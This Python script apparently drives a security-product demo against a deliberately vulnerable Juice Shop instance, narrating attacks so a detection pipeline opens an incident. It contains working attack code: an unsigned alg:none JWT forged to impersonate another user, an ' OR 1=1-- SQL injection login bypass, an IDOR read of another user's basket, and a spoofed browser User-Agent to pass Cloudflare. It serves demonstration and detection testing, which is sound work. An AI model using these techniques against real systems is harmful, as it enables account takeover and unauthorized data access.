"""
Rootlane demo driver.

Drives the demo traffic against a running Juice Shop so the telemetry ->
ClickHouse -> analyzer chain opens an incident on its own, and narrates each
step so a viewer understands the attack on camera. One command instead of
clicking through the app.

Phases:
  baseline  A legitimate user registers, logs in and browses. Gives the
            analyzer a picture of normal authenticated traffic.
  jwt       Forge an unsigned (alg:none) token claiming another user's email
            and call an authenticated route. The hero scenario: 200 on
            vulnerable code (identity accepted), 401 once patched (rejected).
  sqli      SQL injection login bypass (OWASP A03).
  idor      Read another user's basket (OWASP A01); needs a baseline token.

Usage:
  python3 demo/attack.py                      # baseline + jwt against prod
  python3 demo/attack.py --attack all         # all three scenarios
  python3 demo/attack.py --no-baseline        # attack only
  python3 demo/attack.py --expect-status 401  # acceptance mode (patched)
"""

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

from forge import forge_unsigned_jwt

DEFAULT_BASE_URL = "https://juiceshop.rootlane.xyz"
FORGED_EMAIL = "jwtn3d@juice-sh.op"
WHOAMI_ROUTE = "/rest/user/whoami"
LOGIN_ROUTE = "/rest/user/login"
# Cloudflare fronts the site and rejects non-browser agents, so every request
# presents a browser User-Agent unless the caller overrides it.
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)


def verdict_for(status):
    """
    Interpret an attack's HTTP status for the demo narration.

    Args:
        status (int): The response status of the attacking request.

    Returns:
        tuple[str, str]: A `(label, note)` pair. A 2xx means the forged
        request was accepted (the vulnerability); 401/403 means it was
        rejected (patched); anything else is unexpected.
    """
    if 200 <= status < 300:
        return ("VULNERABLE", f"{status} - server ACCEPTED the forged request")
    if status in (401, 403):
        return ("PROTECTED", f"{status} - forged request REJECTED")
    return ("UNEXPECTED", f"{status} - unexpected response")


def _banner(title):
    print(f"\n== {title} ==", flush=True)


def _say(text):
    print(f"   {text}", flush=True)


def _log(method, route, status, note=""):
    stamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
    tail = f"   {note}" if note else ""
    print(f"   [{stamp}] {method:4} {route:28} -> {status}{tail}", flush=True)


def _verdict(status):
    label, note = verdict_for(status)
    print(f"   >> {note}.   [{label}]", flush=True)


def _build_request(method, url, headers=None, body=None):
    data = None
    headers = dict(headers or {})
    headers.setdefault("User-Agent", USER_AGENT)
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        headers["Content-Type"] = "application/json"
    return urllib.request.Request(url, data=data, headers=headers, method=method)


def _request(method, url, headers=None, body=None):
    req = _build_request(method, url, headers=headers, body=body)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode("utf-8", "replace")
    except urllib.error.URLError as err:
        return 0, str(err)


def run_baseline(base_url):
    """Register a legitimate user, log in, browse. Returns (email, token)."""
    _banner("PHASE 1 - Baseline: normal, legitimate traffic")
    _say("A real user registers, logs in with valid credentials and browses.")
    _say("This is what healthy authenticated traffic looks like.")

    email = f"demo_{int(time.time())}@rootlane.xyz"
    password = "DemoPass123!"

    status, _ = _request(
        "POST", f"{base_url}/api/Users", body={"email": email, "password": password}
    )
    _log("POST", "/api/Users", status, f"register {email}")

    status, body = _request(
        "POST", f"{base_url}{LOGIN_ROUTE}", body={"email": email, "password": password}
    )
    token = ""
    try:
        token = json.loads(body).get("authentication", {}).get("token", "")
    except (ValueError, AttributeError):
        pass
    _log("POST", LOGIN_ROUTE, status, "login OK (valid credentials)" if token else "login failed")

    for route in ("/rest/products/search?q=apple", "/api/Products", "/api/Challenges"):
        status, _ = _request("GET", f"{base_url}{route}")
        _log("GET", route.split("?")[0], status, "browsing")

    return email, token


def run_jwt_attack(base_url, repeat=4):
    """Forge an alg:none token and call an authenticated route. Returns status."""
    _banner("PHASE 2 - Attack: identity spoofing with an unsigned JWT (alg:none)")
    _say(f"Target: {base_url}")
    _say('Technique: forge a JWT with header {"alg":"none"} and NO signature.')
    _say("Juice Shop verifies tokens without pinning the algorithm, so an")
    _say("unsigned token that claims another user's identity is accepted.")
    _say(f"Forged token claims to be: {FORGED_EMAIL}")
    _say(f"Replaying it against authenticated route GET {WHOAMI_ROUTE} ...")

    token = forge_unsigned_jwt(FORGED_EMAIL)
    headers = {"Authorization": f"Bearer {token}"}
    last_status = 0
    for _ in range(repeat):
        last_status, _ = _request("GET", f"{base_url}{WHOAMI_ROUTE}", headers=headers)
        _log("GET", WHOAMI_ROUTE, last_status, f"forged token for {FORGED_EMAIL}")
    _verdict(last_status)
    return last_status


def run_sqli_attack(base_url):
    """SQL injection login bypass. Returns status."""
    _banner("Attack: SQL injection login bypass (OWASP A03)")
    _say(f"Target: {base_url}{LOGIN_ROUTE}")
    _say("Technique: inject  ' OR 1=1--  into the email field to bypass the")
    _say("password check and log in as the first user, with no valid credentials.")

    status, _ = _request(
        "POST",
        f"{base_url}{LOGIN_ROUTE}",
        body={"email": "' OR 1=1--", "password": "x"},
    )
    _log("POST", LOGIN_ROUTE, status, "injected ' OR 1=1--")
    _verdict(status)
    return status


def run_idor_attack(base_url, token):
    """Read another user's basket with a legitimate token. Returns status."""
    _banner("Attack: broken access control / IDOR on the basket (OWASP A01)")
    _say(f"Target: {base_url}/rest/basket/2")
    _say("Technique: use our own valid token to read a basket id that is not ours.")
    if not token:
        _log("GET", "/rest/basket/2", 0, "skipped: no baseline token (run with baseline)")
        return 0

    headers = {"Authorization": f"Bearer {token}"}
    status, _ = _request("GET", f"{base_url}/rest/basket/2", headers=headers)
    _log("GET", "/rest/basket/2", status, "reading another user's basket")
    _verdict(status)
    return status


def main(argv=None):
    parser = argparse.ArgumentParser(description="Rootlane demo driver")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    parser.add_argument(
        "--attack", choices=("jwt", "sqli", "idor", "all"), default="jwt"
    )
    parser.add_argument("--no-baseline", dest="baseline", action="store_false")
    parser.add_argument(
        "--expect-status",
        type=int,
        default=None,
        help="acceptance mode: exit non-zero if the hero attack status differs",
    )
    args = parser.parse_args(argv)

    print("Rootlane demo driver", flush=True)
    print(f"Target under attack: {args.base_url}", flush=True)

    token = ""
    if args.baseline:
        _, token = run_baseline(args.base_url)

    hero_status = None
    if args.attack in ("jwt", "all"):
        hero_status = run_jwt_attack(args.base_url)
    if args.attack in ("sqli", "all"):
        run_sqli_attack(args.base_url)
    if args.attack in ("idor", "all"):
        run_idor_attack(args.base_url, token)

    if args.expect_status is not None and hero_status is not None:
        ok = hero_status == args.expect_status
        print(
            f"\nAcceptance: expected {args.expect_status}, got {hero_status}: "
            f"{'PASS' if ok else 'FAIL'}",
            flush=True,
        )
        return 0 if ok else 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
